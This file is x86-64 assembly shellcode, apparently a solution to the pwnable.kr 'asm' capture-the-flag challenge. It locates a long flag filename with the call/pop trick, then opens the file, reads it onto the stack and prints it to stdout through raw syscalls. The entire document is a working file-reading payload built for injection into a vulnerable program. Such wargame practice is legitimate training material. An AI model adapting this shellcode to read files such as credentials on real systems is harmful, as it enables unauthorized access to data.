BITS 64

_start:
    ; Get filename address using call/pop trick
    call get_filename
    db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0

get_filename:
    pop rdi                   ; filename pointer
    
    ; Open file
    mov rax, 2                ; open syscall
    mov rsi, 0                ; O_RDONLY
    syscall
    
    ; Read file
    mov rdi, rax              ; fd
    mov rax, 0                ; read syscall
    sub rsp, 100              ; create buffer on stack
    mov rsi, rsp              ; buffer pointer
    mov rdx, 100              ; bytes to read
    syscall
    
    ; Write to stdout
    mov rdx, rax              ; bytes read
    mov rax, 1                ; write syscall
    mov rdi, 1                ; stdout
    mov rsi, rsp              ; buffer pointer
    syscall